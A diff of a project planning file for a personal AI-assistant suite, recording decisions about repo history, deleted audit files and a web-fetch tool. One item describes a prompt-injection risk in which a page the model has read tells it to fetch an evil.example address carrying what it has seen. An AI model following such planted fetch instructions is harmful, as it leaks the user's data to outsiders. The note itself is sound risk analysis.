@@ -165,7 +165,8 @@ A third real application, made with the checks built on 2026-10-15, showed what 
    schedule.
 7. **No pre-publish check.** Making `suite` public needed a hand-built scan of every commit. This file also mixed
    private operating notes with public documentation.
-8. **The web app cannot open or download a built document** (also on the user's own to-do list).
+8. **The web app cannot open or download a built document** (also on the user's own to-do list). *Stale: the
+   Documents page has opened Docs and downloaded them as PDF or Word since 2026-10-16 (`d5d5da2`).*
 
 ### The plan, in order
 
@@ -532,7 +533,10 @@ Decisions or input only the user can give. Don't guess these.
 8. ~~**Step 3:** may the suite have a tool that fetches arbitrary web pages, with the limits listed there?~~ Decided
    2026-10-25: yes. The job application workflow is the driving use case — see "Job application workflow" above.
 9. ~~**Steps 1 and 2** touch docu-ai and mail-ai: is one yes enough, or does each need approving?~~ **Decided 2026-10-29, the user's call: each separately.** Step 1 (docu-ai) is approved. **Step 2 (mail-ai) approved 2026-10-29**, after the user had seen the tests for the send check (attachments inside what a review covers), and built (see "Built and verified").
-10. **The public history of `suite`.** A few non-secret details are in it (a server id, a person's name, the names
+10. ~~**The public history of `suite`.**~~ **Decided 2026-10-30, the user's call: leave it.** Checked that day: the
+    commit emails (philip@ayadata.ai on 97 commits, the personal Gmail on 1), the instance id in this file, the
+    three applications' names and CV details in apply-ai's tests are in it; the phone number, the recruiter's and
+    referrer's names and any secret are not. Original question: A few non-secret details are in it (a server id, a person's name, the names
     of earlier applications, commit emails). Removing them from history means rewriting `main` and a force-push,
     and copies may already exist. Remove, or leave?
 11. ~~**Should a fetch be held for approval?**~~ **Decided 2026-10-29, the user's call: no, leave web-ai's tools ungated.** The risk stays as written in `web-ai/CLAUDE.md` ("What this does not stop"). Original question: `web-ai`'s tools are read-only, so the assistant's gate never stops one. A GET can carry data out in its address (a page the model read could tell it to fetch `https://evil.example/?q=<what it has seen>`); the 2048-character limit bounds one call, it does not stop it. Marking the tools as writes would make the assistant ask before every fetch. Reasoned, not demonstrated. Gate them, or leave them as the plan says?
@@ -543,8 +547,9 @@ Decisions or input only the user can give. Don't guess these.
 ## Next steps, in order
 
 1. ~~**Postgres (layer 1 of the database plan).**~~ Built 2026-10-28, committed (`78fb441`) and the real import run 2026-10-29 (see "Built and verified").
-   **Still to do for it:** decide what becomes of the older host copies (`assistant/memory.json`, 9 facts, all of
-   them in the container's 15; `assistant/audit.jsonl`), which nothing reads any more. (The two logins found dead
+   **The older host copies are deleted** (2026-10-30, the user's call): `assistant/memory.json` after all 9 of its
+   facts were found identical in the database, and `assistant/audit.jsonl`, knowing 13 of its 628 rows
+   (2026-10-19: an audiobook analysis and render, the rest mail syncs) were in no other place. (The two logins found dead
    on 2026-10-29, AWS and mail-compose, were renewed by the user the same day; `./auth --check` says all good.)
    The database password is the default (`suite`; no published port), because `POSTGRES_PASSWORD` is not set in `.env`.
 2. ~~**Redis (layer 2).**~~ **Deferred to layer 3, 2026-10-29** (see "Layer 2: Redis"): the queries it would cache
